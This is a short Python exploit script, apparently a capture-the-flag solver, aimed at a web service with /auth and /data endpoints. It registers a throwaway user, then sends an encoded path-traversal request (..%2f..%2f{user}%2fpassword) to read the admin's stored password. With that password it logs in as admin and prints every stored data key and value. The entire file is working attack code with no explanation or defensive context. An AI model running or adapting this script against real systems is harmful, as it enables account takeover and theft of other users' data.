import secrets
import requests
import sys


username = "test" + secrets.token_hex(10)

host = sys.argv[1]
port = '80'

def pwn(host: str, user_to_hack='admin'):
    s = requests.Session()
    resp = s.post(f"{host}/auth/register", json={"username": username, "password": "test123zxasdasd"})
    if resp.status_code != 201:
        raise ValueError(f"Failed to register ({resp.status_code}): {resp.text}")
    tok = resp.json()
    print(tok)
    s.headers.update({"Authorization": tok})

    print(f'{host}/data/..%2f..%2f{user_to_hack}%2fpassword')
    response = s.get(f'{host}/data/..%2f..%2f{user_to_hack}%2fpassword')
    if response.status_code != 200:
        raise ValueError(f"Failed to get key ({response.status_code}): {response.text}")
    
    admin_password = response.json()
    print(f"Admin password: {admin_password}")

    session = requests.Session()
    resp = session.post(f"{host}/auth/login", json={"username": user_to_hack, "password": admin_password})
    if resp.status_code != 200:
        raise ValueError(f"Failed to login ({resp.status_code}): {resp.text}")
    tok = resp.json()
    print(tok)
    session.headers.update({"Authorization": tok})

    keys = session.get(f'{host}/data').json()
    print(keys)
    for key in keys:
        parts = key.split('/')
        right = '/'.join(parts[4:])
        
        response = session.get(f'{host}/data/{right}')
        if response.status_code != 200:
            raise ValueError(f"Failed to get key ({response.status_code}): {response.text}")
        print(f"Data for key '{key}': {response.json()}")





if __name__ == "__main__":
    pwn(host)
    


